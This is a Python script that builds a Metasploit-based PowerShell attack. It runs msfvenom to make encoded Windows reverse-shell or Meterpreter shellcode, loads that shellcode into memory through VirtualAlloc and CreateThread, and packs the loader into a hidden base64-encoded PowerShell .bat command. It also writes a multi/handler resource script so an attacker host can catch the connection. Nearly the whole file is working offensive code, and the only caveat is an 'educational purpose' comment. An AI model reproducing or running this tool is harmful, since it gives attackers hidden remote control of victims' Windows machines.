#!/usr/bin/python
# -*- coding: utf-8 -*-

# Please Install Metasploit-Framework first,
# Kali Linux:       apt-get install metasploit-framework
# Notice:           Just For edutional purpose
# License:          BSD License

import logging
import subprocess
import base64
import re
import sys


logging.basicConfig(level=logging.INFO, format="[+] %(message)16s")


def write_file(filename, data):
    """Write data into file"""
    with open(filename, 'w') as f:
        f.write(data)


def execute_command(command):
    """Execute OS Command"""
    logging.debug("Executes command: %s" % command)
    proc = subprocess.Popen(command,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)
    data = proc.communicate()[0]
    return data


def shellcode_filter(shellcode):
    """Filter some bad chars in shellcode"""
    replaces = {';': '',
                ' ': '',
                '+': '',
                '"': '',
                '\n': '',
                'buf=': '',
                'Found 0 compatible encoders': '',
                'unsignedcharbuf[]=': ''}
    for key, value in replaces.iteritems():
        shellcode = shellcode.replace(key, value)

    shellcode = shellcode.rstrip()
    return shellcode


def generate_shellcode(payload, host, port):
    """generate shellcode: \x00\x00\x00...."""
    logging.debug("Metasploit Framework generates shellcode")
    command = ("msfvenom "
               "-p %s "
               "LHOST=%s "
               "LPORT=%s "
               "StagerURILength=5 "
               "StagerVerifySSLCert=false "
               "-e x86/shikata_ga_nai "
               "-a x86 "
               "--platform windows "
               "--smallest "
               "-f c") % (payload, host, port)
    shellcode = execute_command(command)

    return shellcode_filter(shellcode)


def generate_powershell_attack(payload, host, port):
    """generate shellcode: 0x00,0x00,0x00,..."""
    shellcode = generate_shellcode(payload, host, port)
    shellcode = re.sub("\\\\x", "0x", shellcode)

    counter = 0
    floater = ""
    newdata = ""

    for line in shellcode:
        floater += line
        counter += 1
        if counter == 4:
            newdata = newdata + floater + ","
            floater = ""
            counter = 0

    shellcode = newdata[:-1]
    shellcode = generate_powershell(shellcode)
    shellcode = generate_powershell_command(shellcode)

    msfcommand = ("use exploit/multi/handler\n"
                  "set payload %s\n"
                  "set LHOST %s\n"
                  "set LPORT %s\n"
                  "set ExitOnSession false\n"
                  "set EnableStageEncoding true\n"
                  "exploit -j\n") % (payload, host, port)

    logging.info('create msfconsole resource script')
    write_file('powershell_msf.rc', msfcommand)

    logging.info('create powershell shellcode command')
    write_file('powershell_hacking.bat', shellcode)

    return shellcode


def generate_powershell(shellcode):
    shellcode = ("$1 = '$c = ''"
                 "[DllImport(\"kernel32.dll\")]"
                 "public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);"
                 "[DllImport(\"kernel32.dll\")]"
                 "public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);"
                 "[DllImport(\"msvcrt.dll\")]"
                 "public static extern IntPtr memset(IntPtr dest, uint src, uint count);"
                 "'';"
                 "$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;"
                 "[Byte[]];[Byte[]]"
                 "$z = %s;"
                 "$g = 0x1000;"
                 "if ($z.Length -gt 0x1000){$g = $z.Length};"
                 "$x=$w::VirtualAlloc(0,0x1000,$g,0x40);"
                 "for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};"
                 "$w::CreateThread(0,0,$x,0,0,0);"
                 "for (;;){Start-sleep 60};';"
                 "$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));"
                 "$2 = \"-enc \";"
                 "if([IntPtr]::Size -eq 8){$3 = $env:SystemRoot + \"\syswow64\WindowsPowerShell\\v1.0\powershell\";iex \"& $3 $2 $e\"}else{;iex \"& powershell $2 $e\";}" % shellcode)



    return shellcode


def generate_powershell_command(shellcode):
    powershell_attack_help()
    shellcode = base64.b64encode(shellcode.encode('utf_16_le'))
    return "powershell -window hidden -enc %s" % shellcode


def powershell_attack_help():
    doc = ("Everything is now generated in two files, ex:\n"
           "    powershell_hacking.bat - shellcode can be executed in cmd console.\n"
           "                           - Usage: cmd.exe /c powershell_hacking.bat\n"
           "    powershell_msf.rc      - msfconsole resource script.\n"
           "                           - Usage: msfconsole -r powershell_msf.rc\n")

    logging.info(doc)


def banner():
    banner = """
     ######
      #     #  ####  #    #  ####  ######
       #     # #      ##  ## #      #
        ######   ####  # ## #  ####  #####
         #            # #    #      # #
          #       #    # #    # #    # #
           #        ####  #    #  ####  #
    """

    return banner


if __name__ == "__main__":
    argc = len(sys.argv)
    if argc != 4:
        logging.info(banner())
        powershell_attack_help()
        logging.info("python %s windows/shell/reverse_tcp 192.168.1.100 8443" % sys.argv[0])
        logging.info("python %s windows/meterpreter/reverse_tcp 192.168.1.100 8443" % sys.argv[0])
        logging.info("python %s windows/meterpreter/reverse_http 192.168.1.100 8443" % sys.argv[0])
    else:
        payload = sys.argv[1]
        host = sys.argv[2]
        port = sys.argv[3]
        generate_powershell_attack(payload, host, port)
